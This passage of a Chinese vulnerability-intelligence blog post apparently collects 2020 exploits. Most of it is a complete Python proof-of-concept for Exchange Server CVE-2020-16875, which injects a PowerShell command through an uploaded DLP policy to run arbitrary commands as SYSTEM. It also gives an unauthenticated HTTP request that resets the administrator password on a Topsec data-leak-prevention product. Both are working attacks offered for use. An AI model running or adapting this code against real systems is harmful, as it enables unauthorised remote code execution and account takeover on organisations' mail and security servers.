class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string">Patch: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Notes:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The (ab)user needs the "Data Loss Prevention" role assigned and if performing the attack over the ecp interface (this poc) then the user will need an active mailbox.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[PS] C:\Windows\system32&gt;New-RoleGroup -Name "dlp users" -Roles "Data Loss Prevention" -Members "harrym"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Name      AssignedRoles          RoleAssignments                  ManagedBy</span></span><br><span class="line"><span class="string">----      -------------          ---------------                  ---------</span></span><br><span class="line"><span class="string">dlp users &#123;Data Loss Prevention&#125; &#123;Data Loss Prevention-dlp users&#125; &#123;exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[PS] C:\Windows\system32&gt;Get-RoleGroup "dlp users" | Format-List</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RunspaceId                  : 098e1140-30e3-4144-8028-2174fdb43b85</span></span><br><span class="line"><span class="string">ManagedBy                   : &#123;exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test&#125;</span></span><br><span class="line"><span class="string">RoleAssignments             : &#123;Data Loss Prevention-dlp users&#125;</span></span><br><span class="line"><span class="string">Roles                       : &#123;Data Loss Prevention&#125;</span></span><br><span class="line"><span class="string">DisplayName                 :</span></span><br><span class="line"><span class="string">ExternalDirectoryObjectId   :</span></span><br><span class="line"><span class="string">Members                     : &#123;exchangedemo.com/Users/Harry Mull&#125;</span></span><br><span class="line"><span class="string">SamAccountName              : dlp users</span></span><br><span class="line"><span class="string">Description                 :</span></span><br><span class="line"><span class="string">RoleGroupType               : Standard</span></span><br><span class="line"><span class="string">LinkedGroup                 :</span></span><br><span class="line"><span class="string">Capabilities                : &#123;&#125;</span></span><br><span class="line"><span class="string">LinkedPartnerGroupId        :</span></span><br><span class="line"><span class="string">LinkedPartnerOrganizationId :</span></span><br><span class="line"><span class="string">Identity                    : exchangedemo.com/Microsoft Exchange Security Groups/dlp users</span></span><br><span class="line"><span class="string">IsValid                     : True</span></span><br><span class="line"><span class="string">ExchangeVersion             : 0.10 (14.0.100.0)</span></span><br><span class="line"><span class="string">Name                        : dlp users</span></span><br><span class="line"><span class="string">DistinguishedName           : CN=dlp users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com</span></span><br><span class="line"><span class="string">Guid                        : fa5c8458-8255-4ffd-b128-2a66bf9dbfd6</span></span><br><span class="line"><span class="string">ObjectCategory              : exchangedemo.com/Configuration/Schema/Group</span></span><br><span class="line"><span class="string">ObjectClass                 : &#123;top, group&#125;</span></span><br><span class="line"><span class="string">WhenChanged                 : 6/12/2020 11:29:31 PM</span></span><br><span class="line"><span class="string">WhenCreated                 : 6/12/2020 11:29:31 PM</span></span><br><span class="line"><span class="string">WhenChangedUTC              : 6/12/2020 3:29:31 PM</span></span><br><span class="line"><span class="string">WhenCreatedUTC              : 6/12/2020 3:29:31 PM</span></span><br><span class="line"><span class="string">OrganizationId              :</span></span><br><span class="line"><span class="string">Id                          : exchangedemo.com/Microsoft Exchange Security Groups/dlp users</span></span><br><span class="line"><span class="string">OriginatingServer           : DEAD01.exchangedemo.com</span></span><br><span class="line"><span class="string">ObjectState                 : Changed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">researcher@incite:~$ ./poc.py</span></span><br><span class="line"><span class="string">(+) usage: ./poc.py &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;</span></span><br><span class="line"><span class="string">(+) eg: ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">researcher@incite:~$ ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span></span><br><span class="line"><span class="string">(+) logged in as harrym@exchangedemo.com</span></span><br><span class="line"><span class="string">(+) found the __viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5</span></span><br><span class="line"><span class="string">(+) executed mspaint as SYSTEM!</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span><span class="params">(str_len=<span class="number">8</span>)</span>:</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(str_len))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xml</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"""&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;dlpPolicyTemplates&gt;</span></span><br><span class="line"><span class="string">  &lt;dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0"&gt;</span></span><br><span class="line"><span class="string">    &lt;contentVersion&gt;4&lt;/contentVersion&gt;</span></span><br><span class="line"><span class="string">    &lt;publisherName&gt;si&lt;/publisherName&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;description&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/description&gt;</span></span><br><span class="line"><span class="string">    &lt;keywords&gt;&lt;/keywords&gt;</span></span><br><span class="line"><span class="string">    &lt;ruleParameters&gt;&lt;/ruleParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommands&gt;</span></span><br><span class="line"><span class="string">      &lt;commandBlock&gt;</span></span><br><span class="line"><span class="string">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt;</span></span><br><span class="line"><span class="string">      &lt;/commandBlock&gt;</span></span><br><span class="line"><span class="string">    &lt;/policyCommands&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt;</span></span><br><span class="line"><span class="string">  &lt;/dlpPolicyTemplate&gt;</span></span><br><span class="line"><span class="string">&lt;/dlpPolicyTemplates&gt;"""</span> % c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_rce</span><span class="params">(t, s, vs, cmd)</span>:</span></span><br><span class="line">    f = &#123;</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: (<span class="literal">None</span>, vs),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$senderBtn'</span>: (<span class="literal">None</span>, <span class="string">"ResultPanePlaceHolder_ButtonsPanel_btnNext"</span>),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$name'</span>: (<span class="literal">None</span>, random_string()),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl'</span>: (<span class="string">"dlprce.xml"</span>, get_xml(cmd)),</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, files=f, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">"(-) failed to trigger rce!"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_viewstate</span><span class="params">(t, s)</span>:</span></span><br><span class="line">    r = s.get(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, verify=<span class="literal">False</span>)</span><br><span class="line">    match = re.search(<span class="string">"&lt;input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" /&gt;"</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the __viewstate!"</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in</span><span class="params">(t, usr, pwd)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">"destination"</span>: <span class="string">"https://%s/owa"</span> % t,</span><br><span class="line">        <span class="string">"flags"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"username"</span>: usr,</span><br><span class="line">        <span class="string">"password"</span>: pwd</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(<span class="string">"https://%s/owa/auth.owa"</span> % t, data=d, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> s.cookies.get(name=<span class="string">'X-OWA-CANARY'</span>) != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the csrf canary!"</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(t, usr, pwd, cmd)</span>:</span></span><br><span class="line">    s = log_in(t, usr, pwd)</span><br><span class="line">    print(<span class="string">"(+) logged in as %s"</span> % usr)</span><br><span class="line">    vs = leak_viewstate(t, s)</span><br><span class="line">    print(<span class="string">"(+) found the __viewstate: %s"</span> % vs)</span><br><span class="line">    trigger_rce(t, s, vs, cmd)</span><br><span class="line">    print(<span class="string">"(+) executed %s as SYSTEM!"</span> % cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">"(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">"(+) eg: %s 192.168.75.142 harrym@exchangedemo.com:user123### mspaint"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    trgt = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">":"</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>], <span class="string">"(-) you need a user and password!"</span></span><br><span class="line">    usr = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    pwd = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    main(trgt, usr, pwd, cmd)</span><br></pre></td></tr></table></figure>
+
+<h4 id="10、Sangfor-SSL-VPN-远程代码执行-CNVD-2020-48679（历史版本）"><a href="#10、Sangfor-SSL-VPN-远程代码执行-CNVD-2020-48679（历史版本）" class="headerlink" title="10、Sangfor SSL VPN 远程代码执行 CNVD-2020-48679（历史版本）"></a>10、Sangfor SSL VPN 远程代码执行 CNVD-2020-48679（历史版本）</h4><h4 id="11、天融信数据防泄漏系统越权修改管理员密码"><a href="#11、天融信数据防泄漏系统越权修改管理员密码" class="headerlink" title="11、天融信数据防泄漏系统越权修改管理员密码"></a>11、天融信数据防泄漏系统越权修改管理员密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">V3.1130.308p3_DLP.1</span><br><span class="line">无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd接口未授权访问,造成直接修改任意用户密码。</span><br><span class="line">默认superman账户uid为1。</span><br><span class="line">POST /?module=auth_user&amp;action=mod_edit_pwd </span><br><span class="line">Cookie: username=superman;</span><br><span class="line"></span><br><span class="line">uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</span><br></pre></td></tr></table></figure>
+
+<h4 id="12、PHPCMS远程代码执行"><a href="#12、PHPCMS远程代码执行" class="headerlink" title="12、PHPCMS远程代码执行"></a>12、PHPCMS远程代码执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;zLXJtekT9O3OuzwBLigMsA</span><br></pre></td></tr></table></figure>
+
+<h4 id="13、通达OA-V11-7-远程代码执行漏洞"><a href="#13、通达OA-V11-7-远程代码执行漏洞" class="headerlink" title="13、通达OA V11.7 远程代码执行漏洞"></a>13、通达OA V11.7 远程代码执行漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">11.6版本受影响，11.3及2017不受影响</span><br><span class="line">参考链接：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;8rvIT1y_odN2obJ1yAvLbw</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考链接：</p>
+<p><a href="https://mp.weixin.qq.com/s/o_WjFrecBikhUBkmtGsA8A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/o_WjFrecBikhUBkmtGsA8A</a></p>
+<p><a href="https://mp.weixin.qq.com/s/VRL6UPYG040O8L7UEA_TJg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/VRL6UPYG040O8L7UEA_TJg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/oBayKAh9Ctd_AenN3FRVog" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oBayKAh9Ctd_AenN3FRVog</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、天融信-TopApp-LB负载均衡-SQL注入"><span class="toc-number">1.</span> <span class="toc-text">1、天融信 TopApp-LB负载均衡 SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、用友GRP-u8-注入-EXP已公开"><span class="toc-number">2.</span> <span class="toc-text">2、用友GRP-u8 注入 EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、sangfor-EDR-平台权限绕过-amp-RCE-漏洞-EXP已公开"><span class="toc-number">3.</span> <span class="toc-text">3、sangfor EDR 平台权限绕过&amp;RCE 漏洞   EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、绿盟UTS绕过登录-amp-未授权访问-EXP已公开"><span class="toc-number">4.</span> <span class="toc-text">4、绿盟UTS绕过登录&amp;未授权访问 EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、WPS的0day中招据说会提示更新"><span class="toc-number">5.</span> <span class="toc-text">5、WPS的0day中招据说会提示更新</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、齐治堡垒机的利用-CVND-2019-20835-EXP未公开"><span class="toc-number">6.</span> <span class="toc-text">6、齐治堡垒机的利用 CVND-2019-20835 EXP未公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、联软准入的利用-EXP未公开"><span class="toc-number">7.</span> <span class="toc-text">7、联软准入的利用 EXP未公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、泛微OA云桥任意文件读取漏洞-EXP已公开"><span class="toc-number">8.</span> <span class="toc-text">8、泛微OA云桥任意文件读取漏洞 EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、Exchange-Server-远程代码执行漏洞CVE-2020-16875（POC未验证）"><span class="toc-number">9.</span> <span class="toc-text">9、Exchange Server 远程代码执行漏洞CVE-2020-16875（POC未验证）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、Sangfor-SSL-VPN-远程代码执行-CNVD-2020-48679（历史版本）"><span class="toc-number">10.</span> <span class="toc-text">10、Sangfor SSL VPN 远程代码执行 CNVD-2020-48679（历史版本）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11、天融信数据防泄漏系统越权修改管理员密码"><span class="toc-number">11.</span> <span class="toc-text">11、天融信数据防泄漏系统越权修改管理员密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12、PHPCMS远程代码执行"><span class="toc-number">12.</span> <span class="toc-text">12、PHPCMS远程代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13、通达OA-V11-7-远程代码执行漏洞"><span class="toc-number">13.</span> <span class="toc-text">13、通达OA V11.7 远程代码执行漏洞</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&text=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&is_video=false&description=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2020漏洞情报&body=Check out this article: http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&name=2020漏洞情报&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&t=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
